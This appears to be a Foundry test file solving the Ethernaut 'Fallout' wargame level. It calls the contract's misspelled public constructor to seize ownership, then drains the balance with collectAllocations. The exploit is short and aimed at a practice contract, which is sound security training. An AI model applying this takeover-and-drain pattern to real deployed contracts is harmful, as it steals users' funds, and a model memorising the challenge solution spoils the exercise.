pragma solidity ^0.8.17;

import "ds-test/test.sol";
import "../src/Fallout/FalloutFactory.sol";
import "../src/Ethernaut.sol";
import "./utils/vm.sol";

contract FalloutTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        // fund the eoa address
        vm.deal(eoaAddress, 5 ether);
    }

    function testFalloutHack() public {
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        // START

        // call public constructor
        ethernautFallout.Fal1out{value: 1 wei}();
        assertEq(ethernautFallout.owner(), eoaAddress);

        // drain the contract
        ethernautFallout.collectAllocations();
        assertEq(address(ethernautFallout).balance, 0);

        // END

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}